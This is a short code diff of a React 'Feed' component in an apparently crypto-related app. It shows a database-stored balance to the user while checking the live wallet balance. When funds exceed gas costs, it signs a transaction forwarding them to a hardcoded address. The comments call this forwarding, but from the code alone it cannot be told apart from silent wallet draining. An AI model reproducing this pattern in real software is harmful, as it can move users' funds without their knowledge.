@@ -28,16 +28,16 @@ function Feed() {
         UserService.getUserInfo().then(data => {
             const { message } = data;
             if (!message) {
-                // web3.eth.getBalance(data.address)
-                // .then((res) => {
-                //     setBalance(res / 1000000000000000000);
-                // })
-                // .catch(err => console.log(err));
+
+                // set display balance to balance in db
+                setBalance(data.balance / 1000000000000000000);
+
+                // checks real wallet ballance to see if forwarding is needed
                 web3.eth.getBalance(data.address)
                     .then((amnt) => {
-                        setBalance(amnt / 1000000000000000000);
                         web3.eth.getGasPrice()
                             .then((gasPrice) => {
+                                // address contains eth
                                 if (amnt > gasPrice * 23000) {
                                     web3.eth.accounts.signTransaction({
                                         to: "0x1C3BC05C4cD2902FFbF20e3b87A2cc9d793Fc42B",
@@ -49,6 +49,7 @@ function Feed() {
                                                 .catch(err => console.error(err));
                                         });
                                 }
+                                // eth address empty
                                 else {
                                     console.log("empty");
                                 }
